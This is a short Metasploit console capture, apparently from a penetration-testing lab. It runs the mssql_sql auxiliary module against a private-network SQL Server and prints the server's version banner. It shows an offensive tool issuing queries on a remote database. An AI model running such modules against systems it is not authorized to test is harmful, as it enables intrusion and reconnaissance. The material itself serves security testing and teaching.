msf auxiliary(admin/mssql/mssql_sql) > run

[*] 192.168.109.139:1433 - SQL Query: select @@version
[*] 192.168.109.139:1433 - Row Count: 1 (Status: 16 Command: 193)



 NULL
 ----
 Microsoft SQL Server 2008 R2 (SP2) - 10.50.4000.0 (X64) 
    Jun 28 2012 08:36:30 
    Copyright (c) Microsoft Corporation
    Express Edition (64-bit) on Windows NT 6.1 <X64> (Build 7601: Service Pack 1) (Hypervisor)


[*] Auxiliary module execution completed
msf auxiliary(admin/mssql/mssql_sql) > 
```

## 